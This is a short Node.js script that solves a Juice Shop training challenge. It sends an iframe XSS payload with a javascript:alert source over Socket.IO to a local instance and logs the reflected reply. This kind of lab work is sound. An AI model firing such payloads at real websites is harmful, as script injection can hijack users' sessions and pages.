const io = require('socket.io-client');
const socket = io('http://localhost:3000', {
  reconnectionDelayMax: 10000,
});

socket.on('connect', () => {
  console.log('Connected to Juice Shop Socket.IO');
  
  // localXssChallenge
  // The challenge is to XSS yourself.
  // We emit the payload to the localXssChallenge event.
  // The server reflects it back.
  
  const payload = '<iframe src="javascript:alert(`xss`)">';
  console.log('Sending payload:', payload);
  socket.emit('localXssChallenge', payload);
});

socket.on('localXssChallenge', (data) => {
    console.log('Received response:', data);
    console.log('Check the scoreboard!');
    socket.disconnect();
});
